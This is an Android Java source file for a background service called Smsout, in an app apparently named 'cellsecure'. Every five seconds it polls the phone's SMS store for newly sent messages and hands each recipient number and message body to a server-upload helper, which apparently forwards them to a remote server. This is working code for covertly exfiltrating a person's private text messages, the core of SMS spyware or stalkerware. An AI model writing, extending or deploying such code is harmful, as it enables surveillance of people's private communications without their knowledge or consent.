package com.example.cellsecure;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.StrictMode;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

//
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class Smsout extends Service {
	
	String thisSms;

	private final Uri SMS_URI = Uri.parse("content://sms");
    private final String[] COLUMNS = new String[] {"date", "address", "body", "type"};
    private static final String CONDITIONS = "type = 2 AND date > ";
    private static final String ORDER = "date ASC";
    
    private SharedPreferences prefs;
    private long timeLastChecked;
    private Cursor cursor;
    public static long tmpdate=0;
	SharedPreferences sh;

    Handler hd=new Handler();
 
	Runnable runn=new Runnable() {
		
		@SuppressLint("Range")
		@Override
		public void run() {
			
			try{
			
//			Toast.makeText(getApplicationContext(), "sms out", Toast.LENGTH_SHORT).show();
		
			timeLastChecked = prefs.getLong("time_last_checked", -1L);
			ContentResolver cr = getApplicationContext().getContentResolver();

			cursor = cr.query(SMS_URI, COLUMNS, CONDITIONS + timeLastChecked, null, ORDER);

//				Toast.makeText(getApplicationContext(),"time"+timeLastChecked, Toast.LENGTH_LONG).show();
				Toast.makeText(getApplicationContext(),"count"+cursor.getCount(), Toast.LENGTH_LONG).show();
			if (cursor.moveToNext()) 
			{
				//
							Toast.makeText(getApplicationContext(),"hiiiii", Toast.LENGTH_LONG).show();



				Set<String> sentSms = new HashSet<String>();
			    timeLastChecked = cursor.getLong(cursor.getColumnIndex("date"));
			    do 
			    {
			        long date = cursor.getLong(cursor.getColumnIndex("date"));
			        
			        if(date!=tmpdate) {
						//Log.d("hhhhhhhhhhhhh0000000000000000000", "" + date);
						SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");


						// Create a calendar object that will convert the date and time value in milliseconds to date.
						//  Calendar calendar = Calendar.getInstance();

						String date1 = formatter.format(new Date());

						String address = cursor.getString(cursor.getColumnIndex("address"));
						String body = cursor.getString(cursor.getColumnIndex("body"));
						thisSms =  body;

						Log.d("message", thisSms);

//						Toast.makeText(getApplicationContext(), thisSms, Toast.LENGTH_LONG).show();
//						Toast.makeText(getApplicationContext(), "mmmmmmmmmmmm", Toast.LENGTH_SHORT).show();
//						Toast.makeText(getApplicationContext(), address, Toast.LENGTH_SHORT).show();


						serveroperation sop= new serveroperation(getApplicationContext());

						sop.sendmessage("outgoing",address,thisSms);


			        }
			       tmpdate=date;
			    }while(cursor.moveToNext());
			}
		cursor.close();
		Editor editor = prefs.edit();
		editor.putLong("time_last_checked", timeLastChecked);
		editor.commit();
			}catch(Exception e){
			}
			hd.postDelayed(runn, 5000);
		}
		
		
	
	};
	@TargetApi(Build.VERSION_CODES.GINGERBREAD)
	@Override
	public void onCreate() {
		super.onCreate();
		try{
			if(Build.VERSION.SDK_INT>9){
				StrictMode.ThreadPolicy tl=new StrictMode.ThreadPolicy.Builder().permitAll().build();
				StrictMode.setThreadPolicy(tl);
			}
			}catch (Exception e) {
				// TODO: handle exception
			}
		long  time= System.currentTimeMillis();
		prefs= PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
		Editor editor = prefs.edit();
		editor.putLong("time_last_checked", time);
		editor.commit();
		hd.postDelayed(runn, 5000);

	}
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

}
